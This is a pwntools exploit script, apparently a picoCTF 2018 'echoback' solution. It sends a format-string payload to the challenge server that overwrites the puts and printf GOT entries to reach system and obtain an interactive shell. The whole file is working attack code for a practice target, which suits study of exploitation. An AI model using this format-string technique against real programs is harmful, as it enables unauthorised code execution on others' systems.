from pwn import *

# p = process('./echoback')
p = remote('2018shell1.picoctf.com', 22462)
p.recvuntil('input your message:')

vuln_addr = 0x080485ab
vuln_addr_l = 0x85ab
vuln_addr_h = 0x0804
puts_got = 0x0804a01c
printf_got = 0x0804a010
system_addr = 0x08048460
system_addr_l = 0x8460
system_addr_h = 0x0804 # = vuln_addr_h
# payload = p32(puts_got + 2) + p32(puts_got) + '%' + str(vuln_addr_h - 8) + 'c' + '%7$p' + '%' + str(vuln_addr_l - vuln_addr_h) + 'c'  + '%8$p'
payload = p32(puts_got + 2) + p32(puts_got) + p32(printf_got + 2) + p32(printf_got)
payload += '%' + str(vuln_addr_h - 16) + 'c' + '%7$hn' + '%9$hn'
payload += '%' + str(system_addr_l - system_addr_h) + 'c' + '%10$hn'
payload += '%' + str(vuln_addr_l - system_addr_l) + 'c' + '%8$hn'


#with open('out', 'wb') as f:
#    f.write(payload)

p.send(payload)
# p.recvall()
p.interactive()